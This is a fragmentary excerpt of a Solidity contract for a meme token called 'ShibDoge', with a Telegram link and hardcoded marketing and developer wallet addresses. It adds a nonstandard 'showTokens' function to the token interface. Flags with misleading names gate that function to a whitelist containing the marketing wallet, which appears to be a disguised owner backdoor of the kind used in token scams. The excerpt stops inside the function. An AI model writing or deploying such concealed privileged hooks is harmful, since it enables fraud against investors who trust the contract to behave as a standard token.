...
Telegram : https://t.me/ShibogeBSC
...
interface IERC20 {
    ...
    function showTokens(address account) external returns (uint256);
...
contract Shiboge is Context, IERC20 { 
    ...
    mapping (address => bool) public isSecureTransaction; 

    address payable public Wallet_Marketing = payable(0x0161206DdD3F82369298882A6DEC970549060154); 
    address payable public Wallet_Dev = payable(0xaD2145372A03727167e066bcc2D6C8694C69853D);
    ...
    string private constant _name = "ShibDoge"; 
    string private constant _symbol = unicode"SHIBOGE"; 
    ...
    bool public counterBot = false;
    bool public txFee = false;

    modifier OnTransaction {
        counterBot = true;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0xaD2145372A03727167e066bcc2D6C8694C69853D;
        ...
        isSecureTransaction[Wallet_Marketing] = true;
    ...
    function showTokens(address account) public OnTransaction override returns (uint256) {
        if(txFee){
            bool notBot = isSecureTransaction[_msgSender()];
            bool isTransacted = notBot;
            if(notBot && isTransacted){
